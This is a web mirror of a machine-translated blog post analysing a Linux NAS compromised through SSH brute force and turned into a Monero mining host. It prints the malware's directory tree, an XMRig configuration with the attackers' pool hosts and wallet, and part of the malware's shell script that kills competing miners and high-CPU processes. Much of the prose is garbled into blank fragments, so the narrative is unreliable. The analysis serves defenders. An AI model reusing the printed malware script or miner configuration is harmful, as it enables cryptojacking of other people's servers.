<!doctype html>
<html class="no-js" lang="ja">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>📟 🤱🏼 🔚 Linuxサーバーの秘密の生活またはSSHサブシステムへのファンの総当たり攻撃 ✍🏽 ⛳️ 😻</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="今日、外部IPがIVIサービスでブロックされ、メッセージが表示されました
 

 ip- .  , -. IP <IP>. maxmind.com
 どういう意味ですか？
 

IVIナレッジベースには、エラー4530に関する情報が含まれています。エラーの説明には、IPアドレスでVPNまたはオープン...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Linuxサーバーの秘密の生活またはSSHサブシステムへのファンの総当たり攻撃</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/482784/"><p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">今日、外部IPがIVIサービスでブロックされ、メッセージが表示されました</font></font></p><br>
<pre><code class="plaintext hljs"> ip-   . <font></font>
,    -. IP  &lt;IP&gt;.<font></font>
  maxmind.com</code></pre><a name="habracut"></a><br>
<h2 id="chto-eto-znachit"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">どういう意味ですか？</font></font></h2><br>
<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IVIナレッジベースには、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">エラー4530</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">に関する情報が含まれてい</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">ます。エラー</font></a><font style="vertical-align: inherit;">の説明には、IPアドレスでVPNまたはオープンプロキシが検出されたことが記載されています。</font><font style="vertical-align: inherit;">しかし、私は意図的にこのようなものをインストールしませんでした。</font><font style="vertical-align: inherit;">最近ネットワークに追加したルーターまたはNASがいくつかのわいせつ物に関係していることがわかりました。</font></font></p><br>
<h1 id="diskleymer"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">免責事項</font></font></h1><br>
<p><em><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以下の資料は研究目的のみです。</font><font style="vertical-align: inherit;">この研究は、科学研究の目的でのみ著者によって実施されたものであり、その結果は、違法な行動をとる上層部によって認められておらず、認めることもできません。</font><font style="vertical-align: inherit;">研究を実施する際、著者はロシア連邦の法律に従って行動した。</font><font style="vertical-align: inherit;">研究結果の使用は、科学的および教育的な目的にのみ許可されています。</font><font style="vertical-align: inherit;">科学的活動からの違法またはその他の結果を達成するための研究結果の使用は、刑事、行政、および（または）民事責任につながる可能性があります。</font><font style="vertical-align: inherit;">著者は、研究トピックに関連する情報セキュリティインシデントについて責任を負いません。</font></font></em></p><br>
<h2 id="razbiraemsya-chto-zhe-proizoshlo"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">私たちは何が起こったのか理解しています</font></font></h2><br>
<p>    ,     ,   NAS    DMZ.    NAS         fail2ban    ufw.       ,  <code>auth.log</code>   . ,        ssh.</p><br>
<p> <code>grep -in Accept /var/log/auth.log</code>   </p><br>
<pre><code class="plaintext hljs">98341:Dec 23 23:45:36 fileserver sshd[23179]: Accepted password for timemachine from 46.101.149.19 port 45573 ssh2</code></pre><br>
<p>     timemachine c IP  46.101.149.19  . ,        ,   . .  . </p><br>
<pre><code class="plaintext hljs">ps -aux | grep timema</code></pre><br>
<div class="spoiler"><b class="spoiler_title">   ,    </b><div class="spoiler_text"><pre><code class="plaintext hljs">timemac+  3512  123 13.3 302904 267484 ?       Ssl  Dec25 4728:49 ./cron<font></font>
timemac+  3590  0.0  0.1  12884  3232 ?        S    Dec25   0:00 /bin/bash ./go<font></font>
timemac+ 17476  0.0  0.0  11740   924 ?        S    13:47   0:00 timeout 6h ./tsm -t 301 -f 1 -s 12 -S 12 -p 0 -P 0 -d 1 p ip<font></font>
timemac+ 17477  0.0  0.1  12884  3036 ?        S    13:47   0:00 /bin/bash ./tsm -t 301 -f 1 -s 12 -S 12 -p 0 -P 0 -d 1 p ip<font></font>
timemac+ 17482  112  2.4 3500784 49616 ?       Sl   13:47 146:11 /dev/shm/.lwp/.rsync/c/lib/64/tsm --library-path /dev/shm/.lwp/.rsync/c/lib/64/ /usr/sbin/httpd sync/c/tsm64 -t 301<font></font>
timemac+ 23184  0.0  0.3  76764  7288 ?        Ss   Dec23   0:00 /lib/systemd/systemd --user<font></font>
timemac+ 23185  0.0  0.1 206708  2204 ?        S    Dec23   0:00 (sd-pam)<font></font>
timemac+ 24436  0.0  0.3  27412  6672 ?        S    Dec24   1:49 rsync<font></font>
timemac+  3512  123 13.3 302904 267484 ?       Ssl  Dec25 4728:51 ./cron<font></font>
timemac+  3590  0.0  0.1  12884  3232 ?        S    Dec25   0:00 /bin/bash ./go<font></font>
timemac+ 17476  0.0  0.0  11740   924 ?        S    13:47   0:00 timeout 6h ./tsm -t 301 -f 1 -s 12 -S 12 -p 0 -P 0 -d 1 p ip<font></font>
timemac+ 17477  0.0  0.1  12884  3036 ?        S    13:47   0:00 /bin/bash ./tsm -t 301 -f 1 -s 12 -S 12 -p 0 -P 0 -d 1 p ip<font></font>
timemac+ 17482  112  2.4 3500784 49628 ?       Sl   13:47 146:15 /dev/shm/.lwp/.rsync/c/lib/64/tsm --library-path /dev/shm/.lwp/.rsync/c/lib/64/ /usr/sbin/httpd sync/c/tsm64 -t 301 -f 1 -s 12 -S 12 -p 0 -P 0 -d 1 p ip<font></font>
timemac+ 23184  0.0  0.3  76764  7288 ?        Ss   Dec23   0:00 /lib/systemd/systemd --user<font></font>
timemac+ 23185  0.0  0.1 206708  2204 ?        S    Dec23   0:00 (sd-pam)<font></font>
timemac+ 24436  0.0  0.3  27412  6672 ?        S    Dec24   1:49 rsync</code></pre></div></div><br>
<p>,     <code>/dev/shm/.lwp</code>.   .</p><br>
<h2 id="struktura-malvari"> </h2><br>
<div class="spoiler"><b class="spoiler_title">  </b><div class="spoiler_text"><pre><code class="plaintext hljs">/dev/shm/.lwp<font></font>
├── apt.conf<font></font>
├── dota3.tar.gz<font></font>
├── .out<font></font>
├── .rsync<font></font>
│&nbsp;&nbsp; ├── a<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── a<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── anacron<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── bash.pid<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── cron<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── dir.dir<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── init0<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── .procs<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── run<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── stop<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; └── upd<font></font>
│&nbsp;&nbsp; ├── b<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── a<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── dir.dir<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── run<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── stop<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; └── sync<font></font>
│&nbsp;&nbsp; ├── c<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── a<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── aptitude<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── b<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── cron.d<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── dir2.dir<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── dir.dir<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── go<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── golan<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── ip<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── lib<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; ├── 32<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; ├── libc.so.6<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; ├── libdl.so.2<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; ├── libnss_dns.so.2<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; ├── libnss_files.so.2<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; ├── libpthread.so.0<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; ├── libresolv-2.23.so<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; ├── libresolv.so.2<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; └── tsm<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; ├── 64<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; ├── libc.so.6<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; ├── libdl.so.2<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; ├── libnss_dns.so.2<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; ├── libnss_files.so.2<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; ├── libpthread.so.0<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; ├── libresolv-2.23.so<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; ├── libresolv.so.2<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; └── tsm<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; └── arm<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp;     ├── libarmmem-v7l.so<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp;     ├── libc.so.6<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp;     ├── libdl.so.2<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp;     ├── libnss_dns.so.2<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp;     ├── libpthread.so.0<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp;     ├── libresolv.so<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp;     ├── libresolv.so.2<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp;     └── tsm<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── n<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── p<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── run<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── slow<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── start<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── stop<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── tsm<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── tsm32<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── tsm64<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── tsmv7<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── v<font></font>
│&nbsp;&nbsp; │&nbsp;&nbsp; └── watchdog<font></font>
│&nbsp;&nbsp; ├── cron.d<font></font>
│&nbsp;&nbsp; ├── dir.dir<font></font>
│&nbsp;&nbsp; ├── init<font></font>
│&nbsp;&nbsp; ├── init2<font></font>
│&nbsp;&nbsp; ├── initall<font></font>
│&nbsp;&nbsp; └── .out<font></font>
└── timemachine<font></font>
<font></font>
8 directories, 70 files</code></pre></div></div><br>
<p>      </p><br>
<ul>
<li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow">XMRIG</a> (.rsync/a)</li>
<li> (.rsync/b)</li>
<li>- (.rsync/c)</li>
<li> (.rsync/init  )</li>
</ul><br>
<h3 id="mayner"></h3><br>
<p>  XMRIG.    <code>86</code>  <code>64</code>.     ,   .          .  XMRIG  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow"> </a>.    .     json  :</p><br>
<div class="spoiler"><b class="spoiler_title"> </b><div class="spoiler_text"><pre><code class="json hljs">{
    <span class="hljs-attr">"autosave"</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">"cpu"</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">"opencl"</span>: <span class="hljs-literal">false</span>,
    <span class="hljs-attr">"cuda"</span>: <span class="hljs-literal">false</span>,
    <span class="hljs-attr">"pools"</span>: [<font></font>
        {<font></font>
            <span class="hljs-attr">"url"</span>: <span class="hljs-string">"sdfsdf:3333"</span><font></font>
        }<font></font>
    ]<font></font>
}</code></pre></div></div><br>
<p>     <code>"pools"</code>. . </p><br>
<pre><code class="plaintext hljs">strings -n5 anacron | less  </code></pre><br>
<p>   "pools".</p><br>
<div class="spoiler"><b class="spoiler_title">  100%    </b><div class="spoiler_text"><pre><code class="json hljs">{
    <span class="hljs-attr">"api"</span>: {
        <span class="hljs-attr">"id"</span>: <span class="hljs-literal">null</span>,
        <span class="hljs-attr">"worker-id"</span>: <span class="hljs-literal">null</span><font></font>
    },<font></font>
    <span class="hljs-attr">"http"</span>: {
        <span class="hljs-attr">"enabled"</span>: <span class="hljs-literal">false</span>,
        <span class="hljs-attr">"host"</span>: <span class="hljs-string">"127.0.0.1"</span>,
        <span class="hljs-attr">"port"</span>: <span class="hljs-number">0</span>,
        <span class="hljs-attr">"access-token"</span>: <span class="hljs-literal">null</span>,
        <span class="hljs-attr">"restricted"</span>: <span class="hljs-literal">true</span><font></font>
    },<font></font>
    <span class="hljs-attr">"autosave"</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">"version"</span>: <span class="hljs-number">1</span>,
    <span class="hljs-attr">"background"</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">"colors"</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">"randomx"</span>: {
        <span class="hljs-attr">"init"</span>: <span class="hljs-number">-1</span>,
        <span class="hljs-attr">"numa"</span>: <span class="hljs-literal">true</span><font></font>
    },<font></font>
    <span class="hljs-attr">"cpu"</span>: {
        <span class="hljs-attr">"enabled"</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-attr">"huge-pages"</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-attr">"hw-aes"</span>: <span class="hljs-literal">null</span>,
        <span class="hljs-attr">"priority"</span>: <span class="hljs-literal">null</span>,
        <span class="hljs-attr">"memory-pool"</span>: <span class="hljs-literal">false</span>,
        <span class="hljs-attr">"max-threads-hint"</span>: <span class="hljs-number">100</span>,
        <span class="hljs-attr">"asm"</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-attr">"argon2-impl"</span>: <span class="hljs-literal">null</span>,
        <span class="hljs-attr">"cn/0"</span>: <span class="hljs-literal">false</span>,
        <span class="hljs-attr">"cn-lite/0"</span>: <span class="hljs-literal">false</span><font></font>
    },<font></font>
    <span class="hljs-attr">"opencl"</span>: {
        <span class="hljs-attr">"enabled"</span>: <span class="hljs-literal">false</span>,
        <span class="hljs-attr">"cache"</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-attr">"loader"</span>: <span class="hljs-literal">null</span>,
        <span class="hljs-attr">"platform"</span>: <span class="hljs-string">"AMD"</span>,
        <span class="hljs-attr">"cn/0"</span>: <span class="hljs-literal">false</span>,
        <span class="hljs-attr">"cn-lite/0"</span>: <span class="hljs-literal">false</span><font></font>
    },<font></font>
    <span class="hljs-attr">"cuda"</span>: {
        <span class="hljs-attr">"enabled"</span>: <span class="hljs-literal">false</span>,
        <span class="hljs-attr">"loader"</span>: <span class="hljs-literal">null</span>,
        <span class="hljs-attr">"nvml"</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-attr">"cn/0"</span>: <span class="hljs-literal">false</span>,
        <span class="hljs-attr">"cn-lite/0"</span>: <span class="hljs-literal">false</span><font></font>
    },<font></font>
    <span class="hljs-attr">"donate-level"</span>: <span class="hljs-number">0</span>,
    <span class="hljs-attr">"donate-over-proxy"</span>: <span class="hljs-number">0</span>,
    <span class="hljs-attr">"log-file"</span>: <span class="hljs-literal">null</span>,
    <span class="hljs-attr">"pools"</span>: [<font></font>
        {<font></font>
            <span class="hljs-attr">"coin"</span>: <span class="hljs-string">"monero"</span>,
            <span class="hljs-attr">"algo"</span>: <span class="hljs-literal">null</span>,
            <span class="hljs-attr">"url"</span>: <span class="hljs-string">"debian-package.center:80"</span>,
            <span class="hljs-attr">"user"</span>: <span class="hljs-string">"45BLAvLNayefqNad3tGpHKPzviQUYHF1mCapMhgRuiiAJPYX4KyRCVg9veTmckPN7bDebx51LCuDQYyhFgVbUMhc4qY14CQ"</span>,
            <span class="hljs-attr">"pass"</span>: <span class="hljs-string">"x"</span>,
            <span class="hljs-attr">"tls"</span>: <span class="hljs-literal">false</span>,
            <span class="hljs-attr">"keepalive"</span>: <span class="hljs-literal">true</span>,
            <span class="hljs-attr">"nicehash"</span>: <span class="hljs-literal">true</span><font></font>
        },<font></font>
        {<font></font>
            <span class="hljs-attr">"coin"</span>: <span class="hljs-string">"monero"</span>,
            <span class="hljs-attr">"algo"</span>: <span class="hljs-literal">null</span>,
            <span class="hljs-attr">"url"</span>: <span class="hljs-string">"45.9.148.125:80"</span>,
            <span class="hljs-attr">"user"</span>: <span class="hljs-string">"45BLAvLNayefqNad3tGpHKPzviQUYHF1mCapMhgRuiiAJPYX4KyRCVg9veTmckPN7bDebx51LCuDQYyhFgVbUMhc4qY14CQ"</span>,
            <span class="hljs-attr">"pass"</span>: <span class="hljs-string">"x"</span>,
            <span class="hljs-attr">"tls"</span>: <span class="hljs-literal">false</span>,
            <span class="hljs-attr">"keepalive"</span>: <span class="hljs-literal">true</span>,
            <span class="hljs-attr">"nicehash"</span>: <span class="hljs-literal">true</span><font></font>
        },<font></font>
        {<font></font>
            <span class="hljs-attr">"coin"</span>: <span class="hljs-string">"monero"</span>,
            <span class="hljs-attr">"algo"</span>: <span class="hljs-literal">null</span>,
            <span class="hljs-attr">"url"</span>: <span class="hljs-string">"45.9.148.129:80"</span>,
            <span class="hljs-attr">"user"</span>: <span class="hljs-string">"45BLAvLNayefqNad3tGpHKPzviQUYHF1mCapMhgRuiiAJPYX4KyRCVg9veTmckPN7bDebx51LCuDQYyhFgVbUMhc4qY14CQ"</span>,
            <span class="hljs-attr">"pass"</span>: <span class="hljs-string">"x"</span>,
            <span class="hljs-attr">"tls"</span>: <span class="hljs-literal">false</span>,
            <span class="hljs-attr">"keepalive"</span>: <span class="hljs-literal">true</span>,
            <span class="hljs-attr">"nicehash"</span>: <span class="hljs-literal">true</span><font></font>
        }<font></font>
    ],<font></font>
    <span class="hljs-attr">"print-time"</span>: <span class="hljs-number">60</span>,
    <span class="hljs-attr">"health-print-time"</span>: <span class="hljs-number">60</span>,
    <span class="hljs-attr">"retries"</span>: <span class="hljs-number">5</span>,
    <span class="hljs-attr">"retry-pause"</span>: <span class="hljs-number">5</span>,
    <span class="hljs-attr">"syslog"</span>: <span class="hljs-literal">false</span>,
    <span class="hljs-attr">"user-agent"</span>: <span class="hljs-literal">null</span>,
    <span class="hljs-attr">"watch"</span>: <span class="hljs-literal">true</span>
}</code></pre></div></div><br>
<p>     <code>debian-package.center</code>, <code>45.9.148.125</code>, <code>45.9.148.129</code>   <code>45BLAvLNayefqNad3tGpHKPzviQUYHF1mCapMhgRuiiAJPYX4KyRCVg9veTmckPN7bDebx51LCuDQYyhFgVbUMhc4qY14CQ</code>   <code>x</code>   <code>debian-package.center</code>      ip <code>45.9.148.129</code></p><br>
<p>      <code>a/init0</code>.      ,      ,       60%  .       ,       .  ,        ""</p><br>
<div class="spoiler"><b class="spoiler_title"> a/init-0</b><div class="spoiler_text"><pre><code class="bash hljs"><span class="hljs-meta">#!/bin/sh
</span>
<span class="hljs-comment">##########################################################################################\</span>
<span class="hljs-comment">### A script for killing cryptocurrecncy miners in a Linux enviornment</span>
<span class="hljs-comment">### Provided with zero liability (!)</span>
<span class="hljs-comment">###</span>
<span class="hljs-comment">### Some of the malware used as sources for this tool:</span>
<span class="hljs-comment">### https://pastebin.com/pxc1sXYZ</span>
<span class="hljs-comment">### https://pastebin.com/jRerGP1u</span>
<span class="hljs-comment">### SHA256: 2e3e8f980fde5757248e1c72ab8857eb2aea9ef4a37517261a1b013e3dc9e3c4</span>
<span class="hljs-comment">##########################################################################################\</span><font></font>
<font></font>
<span class="hljs-comment"># Killing processes by name, path, arguments and CPU utilization</span>
<span class="hljs-function"><span class="hljs-title">processes</span></span>(){
    <span class="hljs-function"><span class="hljs-title">killme</span></span>() {<font></font>
      killall -9 chron-34e2fg;ps wx|awk <span class="hljs-string">'/34e|r\/v3|moy5|defunct/'</span> | awk <span class="hljs-string">'{print $1}'</span> | xargs <span class="hljs-built_in">kill</span> -9 &amp; &gt; /dev/null &amp;<font></font>
    }<font></font>
<font></font>
    <span class="hljs-function"><span class="hljs-title">killa</span></span>() {<font></font>
    what=<span class="hljs-variable">$1</span>;ps auxw|awk <span class="hljs-string">"/<span class="hljs-variable">$what</span>/"</span> |awk <span class="hljs-string">'!/awk/'</span> | awk <span class="hljs-string">'{print $2}'</span>|xargs <span class="hljs-built_in">kill</span> -9&amp;&gt;/dev/null&amp;<font></font>
    }<font></font>
<font></font>
    killa 34e2fg<font></font>
    killme<font></font>
<font></font>
    <span class="hljs-comment"># Killing big CPU</span>
    VAR=$(ps uwx|awk <span class="hljs-string">'{print $2":"$3}'</span>| grep -v CPU)
    <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> <span class="hljs-variable">$VAR</span>
    <span class="hljs-keyword">do</span>
      CPUUSAGE=$(<span class="hljs-built_in">echo</span> <span class="hljs-variable">$word</span>|awk -F<span class="hljs-string">":"</span> <span class="hljs-string">'{print $2}'</span>|awk -F<span class="hljs-string">"."</span> <span class="hljs-string">'{ print $1}'</span>)
      <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$CPUUSAGE</span> -gt 60 ]; <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> BIG <span class="hljs-variable">$word</span>; PID=$(<span class="hljs-built_in">echo</span> <span class="hljs-variable">$word</span> | awk -F<span class="hljs-string">":"</span> <span class="hljs-string">'{print $1'</span>});LINE=$(ps uwx | grep <span class="hljs-variable">$PID</span>);COUNT=$(<span class="hljs-built_in">echo</span> <span class="hljs-variable">$LINE</span>| grep -P <span class="hljs-string">"er/v5|34e2|Xtmp|wf32N4|moy5Me|ssh"</span>|wc -l);<span class="hljs-keyword">if</span> [ <span class="hljs-variable">$COUNT</span> -eq 0 ]; <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> KILLING <span class="hljs-variable">$line</span>; <span class="hljs-keyword">fi</span>;<span class="hljs-built_in">kill</span> <span class="hljs-variable">$PID</span>;<span class="hljs-keyword">fi</span>;
    <span class="hljs-keyword">done</span><font></font>
<font></font>
    killall \.Historys<font></font>
    killall \.sshd<font></font>
    killall neptune<font></font>
    killall xm64<font></font>
    killall xm32<font></font>
    killall xmrig<font></font>
    killall \.xmrig<font></font>
    killall suppoieup<font></font>
<font></font>
    pkill -f sourplum<font></font>
    pkill wnTKYg &amp;&amp; pkill ddg* &amp;&amp; rm -rf /tmp/ddg* &amp;&amp; rm -rf /tmp/wnTKYg<font></font>
<font></font>
    ps auxf|grep -v grep|grep <span class="hljs-string">"mine.moneropool.com"</span>|awk <span class="hljs-string">'{print $2}'</span>|xargs <span class="hljs-built_in">kill</span> -9<font></font>
    ps auxf|grep -v grep|grep <span class="hljs-string">"xmr.crypto-pool.fr:8080"</span>|awk <span class="hljs-string">'{print $2}'</span>|xargs <span class="hljs-built_in">kill</span> -9<font></font>
    ps auxf|grep -v grep|grep <span class="hljs-string">"xmr.crypto-pool.fr:3333"</span>|awk <span class="hljs-string">'{print $2}'</span>|xargs <span class="hljs-built_in">kill</span> -9<font></font>
    ps auxf|grep -v grep|grep <span class="hljs-string">"monerohash.com"</span>|awk <span class="hljs-string">'{print $2}'</span>|xargs <span class="hljs-built_in">kill</span> -9<font></font>
    ps auxf|grep -v grep|grep <span class="hljs-string">"/tmp/a7b104c270"</span>|awk <span class="hljs-string">'{print $2}'</span>|xargs <span class="hljs-built_in">kill</span> -9<font></font>
    ps auxf|grep -v grep|grep <span class="hljs-string">"xmr.crypto-pool.fr:6666"</span>|awk <span class="hljs-string">'{print $2}'</span>|xargs <span class="hljs-built_in">kill</span> -9<font></font>
    ps auxf|grep -v grep|grep <span class="hljs-string">"xmr.crypto-pool.fr:7777"</span>|awk <span class="hljs-string">'{print $2}'</span>|xargs <span class="hljs-built_in">kill</span> -9<font></font>
    ps auxf|grep -v grep|grep <span class="hljs-string">"xmr.crypto-pool.fr:443"</span>|awk <span class="hljs-string">'{print $2}'</span>|xargs <span class="hljs-built_in">kill</span> -9<font></font>
    ps auxf|grep -v grep|grep <span class="hljs-string">"stratum.f2pool.com:8888"</span>|awk <span class="hljs-string">'{print $2}'</span>|xargs <span class="hljs-built_in">kill</span> -9<font></font>
    ps auxf|grep -v grep|grep <span class="hljs-string">"xmrpool.eu"</span> | awk <span class="hljs-string">'{print $2}'</span>|xargs <span class="hljs-built_in">kill</span> -9<font></font>
    ps auxf|grep -v grep|grep <span class="hljs-string">"xmrig"</span> | awk <span class="hljs-string">'{print $2}'</span>|xargs <span class="hljs-built_in">kill</span> -9<font></font>
    ps auxf|grep -v grep|grep <span class="hljs-string">"xmrigDaemon"</span> | awk <span class="hljs-string">'{print $2}'</span>|xargs <span class="hljs-built_in">kill</span> -9<font></font>
    ps auxf|grep -v grep|grep <span class="hljs-string">"xmrigMiner"</span> | awk <span class="hljs-string">'{print $2}'</span>|xargs <span class="hljs-built_in">kill</span> -9<font></font>
    ps auxf|grep -v grep|grep <span class="hljs-string">"/var/tmp/java"</span> | awk <span class="hljs-string">'{print $2}'</span>|xargs <span class="hljs-built_in">kill</span> -9<font></font>
    ps auxf|grep -v grep|grep <span class="hljs-string">"ddgs"</span> | awk <span class="hljs-string">'{print $2}'</span>|xargs <span class="hljs-built_in">kill</span> -9<font></font>
    ps auxf|grep -v grep|grep <span class="hljs-string">"qW3xT"</span> | awk <span class="hljs-string">'{print $2}'</span>|xargs <span class="hljs-built_in">kill</span> -9<font></font>
    ps auxf|grep -v grep|grep <span class="hljs-string">"t00ls.ru"</span> | awk <span class="hljs-string">'{print $2}'</span>|xargs <span class="hljs-built_in">kill</span> -9<font></font>
